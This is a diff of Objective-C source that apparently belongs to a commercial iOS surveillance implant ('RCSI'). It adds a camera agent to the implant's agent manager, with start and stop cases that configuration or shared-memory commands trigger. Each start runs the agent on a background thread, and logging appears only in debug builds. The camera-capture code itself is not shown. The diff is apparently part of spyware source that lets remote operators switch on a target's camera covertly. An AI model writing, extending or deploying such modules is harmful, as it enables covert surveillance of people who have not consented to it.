@@ -20,6 +20,7 @@
 #import "RCSIAgentDevice.h"
 #import "RCSIAgentCallList.h"
 #import "RCSIInfoManager.h"
+#import "RCSIAgentCamera.h"
 
 #import "NSMutableDictionary+ThreadSafe.h"
 #import "RCSISharedMemory.h"
@@ -860,6 +861,34 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           }
         break;
       }
+    case AGENT_CAM:
+      {
+#ifdef DEBUG
+        NSLog(@"Starting Agent Camera");
+#endif
+        RCSIAgentCamera *agentCamera = [RCSIAgentCamera sharedInstance];
+        
+        agentConfiguration = [[self getConfigForAgent: agentID] retain];
+      
+        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
+            [agentConfiguration objectForKey: @"status"] != AGENT_START)
+          {
+            [agentConfiguration setObject: AGENT_START forKey: @"status"];
+        
+            agentCamera->mAgentConfiguration = agentConfiguration;
+        
+            [NSThread detachNewThreadSelector: @selector(start)
+                                     toTarget: agentCamera
+                                   withObject: nil];
+          }
+        else
+          {
+#ifdef DEBUG
+            NSLog(@"Agent Camera is already running");
+#endif
+          }
+        break;
+      }
     default:
       {
         break;
@@ -1168,6 +1197,27 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 
         [agentCommand release];
 
+        break;
+      }
+    case AGENT_CAM:
+      {
+#ifdef DEBUG
+        NSLog(@"Stopping Agent Camera");
+#endif
+        RCSIAgentCamera *agentCamera = [RCSIAgentCamera sharedInstance];
+      
+        if ([agentCamera stop] == FALSE)
+          {
+#ifdef DEBUG
+            NSLog(@"Error while stopping agent Camera");
+#endif
+          }
+        else
+          {
+            agentConfiguration = [self getConfigForAgent: agentID];
+            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+          }
+      
         break;
       }
     default:
@@ -1558,6 +1608,25 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                 [agentCommand release];
                 break;
               }
+            case AGENT_CAM:
+              {
+#ifdef DEBUG
+                NSLog(@"Starting Agent Camera");
+#endif
+                RCSIAgentCamera *agentCamera = [RCSIAgentCamera sharedInstance];
+              
+                agentConfiguration = [[self getConfigForAgent: agentID] retain];
+              
+                [anObject setObject: AGENT_START forKey: @"status"];
+                
+                agentCamera->mAgentConfiguration = anObject;
+            
+                [NSThread detachNewThreadSelector: @selector(start)
+                                         toTarget: agentCamera
+                                       withObject: nil];
+               
+                break;
+              }
             default:
               break;
             }
@@ -1858,6 +1927,27 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 
                 [agentCommand release];
 
+                break;
+              }
+            case AGENT_CAM:
+              {
+#ifdef DEBUG
+                NSLog(@"Stopping Agent Camera");
+#endif
+                RCSIAgentCamera *agentCamera = [RCSIAgentCamera sharedInstance];
+              
+                if ([agentCamera stop] == FALSE)
+                  {
+#ifdef DEBUG
+                    NSLog(@"Error while stopping agent Camera");
+#endif
+                  }
+                else
+                  {
+                    [anObject setObject: AGENT_STOPPED
+                                 forKey: @"status"];
+                  }
+              
                 break;
               }
             default:
